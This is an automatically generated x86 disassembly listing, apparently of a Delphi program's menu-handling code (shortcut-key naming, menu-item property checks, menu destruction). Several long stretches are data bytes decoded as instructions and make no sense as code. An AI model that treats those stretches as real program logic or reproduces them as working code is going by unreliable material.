call sub_4036c0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_450288
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
mov edx esi
call sub_44fc00
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4502d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4502f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450300
retn
sub_4505f0
or [ eax ] bl
inc ebp
add [ eax + 0x18 ] al
inc ebp
add [ eax + 0x18 ] dh
inc ebp
add [ ecx + ebx ] al
inc ebp
add [ eax + 0x7c004518 ] ah
loope r-xdata
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
add al dl
sbb [ ebp ] al
inc eax
sbb [ ebp ] eax
je r-xdata
sbb al 0x39
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx - 0x1e07ffbb ] al
inc esp
add ah bh
loope r-xdata
inc ebp
add [ eax + 0x4004519 ] ch
sbb al [ ebp ]
and al 0x1a
inc ebp
add [ edx + ebx + 0x45 ] al
add [ edx + ebx + 0x45 ] ah
add al dh
loope r-xdata
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah cl
sbb eax [ ebp ]
sbb [ ebx + 0x45 ] al
add al dl
and [ ebp ] eax
test [ edx + 0x41 ] ch
add [ eax ] bl
and [ ebp ] al
nop
inc ebx
inc ebp
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + 0x1b ] dl
inc ebp
add [ ebp + esi + 0x45 ] bh
add [ esp ] ah
inc ebp
add [ eax ] dl
aaa
inc ebp
add [ esi + edi + 0x45 ] bh
add [ eax ] bh
cmp al 0x45
add [ eax + 0x3d ] dh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
add [ esi ] dh
pop es
inc ebp
add [ eax + eax + 0x48640000 ] ch
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
add [ eax - 0x3bffbae6 ] ah
sbb al [ ebp ]
in al 0x1a
inc ebp
add [ ebx + ebx ] al
inc ebp
add al ah
pop ss
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
pop es
inc ebp
sub_450714
clc
push edx
push ecx
push [ eax + eax * 2 + 0x3ab40045 ]
inc ebp
add [ ebx + edi + 0x3bbc0045 ] al
inc ebp
add [ eax + eax * 2 ] ah
inc ebp
add [ eax ] dl
inc eax
inc ebp
add [ eax ] dl
cmp [ ebp ] eax
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x146b6365
add eax 0x3b0045
add bh bh
inc esp
dec ebx
inc ebp
add [ ecx ] al
arpl [ ebx + 0x14 ] bp
insd
inc esp
pop es
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul ebp [ eax + edx + 0x300040 ] 0x0
jmp [ ecx + edi ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
test al 0x6
inc ebp
add [ eax + 0x49 ] ah
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
jmp [ eax + 0x3a ]
insd
popad
jae r-xdata
add bh bh
and al 0x39
inc ebp
add al bh
inc ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
adc al 0x5
inc ebp
add [ eax + eax ] bh
add bh bh
ror [ ebp + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
dec edx
inc ecx
add [ edx + edi + 0x3f400045 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
adc [ eax ] al
cmp al [ eax ]
add bh bh
fdivr [ ebx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
xchg esp eax
cmp [ ebp ] eax
sbb [ edx + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
cmp al 0xeb
inc esp
add [ eax + eax ] bh
jmp esp
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
call [ ecx + edi + 0x42180045 ]
inc ebp
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45036470
add [ eax ] cl
add bh bh
adc al 0x39
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
insb
push es
inc edx
add [ eax ] bl
aas
inc ebp
add [ eax + 0x100453f ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
js r-xdata
je r-xdata
mov eax 0x4542
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
lodsb [ esi ]
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
pop eax
inc edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
call [ ebx + edi ]
inc ebp
add [ eax + 0x4542 ] bl
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
call 0x38454e0d
inc edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
inc [ ebx + edi ]
inc ebp
add al bl
inc edx
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
xor al 0x41
add [ eax - 0x77010000 ] cl
add [ eax ] al
add [ esi + esi + 0x40 ] dh
add ah al
dec ebp
inc ebp
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah ch
push ebp
inc ebp
add [ eax + 0x4004556 ] cl
cmp [ eax ] eax
push 0x1c0041e2
ja r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ edx ] bl
or eax [ ebp ]
or eax [ cs : ebp ]
pop eax
add [ eax ] al
add [ eax + ecx * 2 + 0x41 ] ah
je r-xdata
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
insd
mov ah 0x4
inc ebp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
jae r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] ch
dec ebp
inc ebp
add ah dl
push ebp
inc ebp
add [ eax ] bl
dec esi
inc ebp
add [ esi + edx * 2 ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ch
add [ eax ] al
add eax [ eax ]
std
adc al 0xe6
jb r-xdata
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ebp
add [ esi ] al
inc ecx
dec ecx
je r-xdata
out 0x41 al
insd
lea eax [ eax ]
int3
sub_451200
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4405dc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_445e0c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_451258
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_451290
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_40442c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404694
sub_4512e4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_4514cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4044c4
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40460c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4044c4
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4044c4
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40460c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40460c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40442c
mov eax esi
call sub_40442c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4044c4
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408a8c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404730
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_451290
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046ec
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4044c4
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046ec
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4046ec
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4514d4
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404450
retn
sub_4514e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4046e4
push eax
mov eax edi
call sub_4046e4
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4046e4
push eax
mov eax edi
call sub_4048dc
push eax
mov eax [ esi ]
call sub_4048dc
pop edx
pop ecx
call sub_408850
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4046e4
mov ecx eax
mov eax esi
mov edx 0x1
call sub_40497c
sub_451544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_45161f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4514e8
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4514e8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4514e8
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4514e8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451626
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4512e4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408800
test eax eax
jne r-xdata
sub_45165c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_453abc
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_453acc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4516bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_453abc
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_453abc
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_453acc
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_453acc
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45165c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45165c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_453acc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_453acc
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_451808
push ebx
mov ebx eax
mov eax ebx
call sub_44e118
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4565dc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_451840
push ebx
mov ebx eax
mov eax ebx
call sub_44e12c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_451870
push ebx
mov ebx eax
mov eax ebx
call sub_44e140
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4518a0
push ebx
mov ebx eax
mov eax ebx
call sub_44e168
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4518d0
push ebx
mov ebx eax
mov eax ebx
call sub_44e190
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404828
je r-xdata
mov al 0x1
pop ebx
retn
sub_451904
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44e154
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_451940
push ebx
mov ebx eax
mov eax ebx
call sub_44e1a4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_451974
push ebx
mov ebx eax
mov eax ebx
call sub_44e1b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4519a8
push ebx
mov ebx eax
mov eax ebx
call sub_44e1cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4519dc
push ebx
mov ebx eax
mov eax ebx
call sub_41eab4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_451a04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_451a24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_453924
sub_451a44
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_453994
sub_451a64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4539e8
sub_451a84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_451aa0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404480
sub_451ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_453b14
sub_451ae4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_453af0
sub_451b04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_453b04
sub_451b24
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_451b50
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e1a4
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45163c
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_454420
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_451bcc
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4563bc
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_453abc
test eax eax
jg r-xdata
mov edx esi
call sub_453e54
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_453acc
call sub_4036c0
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4036c0
lea eax [ esi + 0x44 ]
call sub_40dabc
lea eax [ esi + 0x78 ]
call sub_40dabc
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_451fe8
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41699c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
call sub_4036c0
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_451c80
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_451edb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451ee2
lea eax [ ebp - 0x40 ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4044c4
mov eax ebx
call sub_453abc
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_452184
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404828
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_453abc
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_454078
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_4512e4
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4047a4
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4048dc
push eax
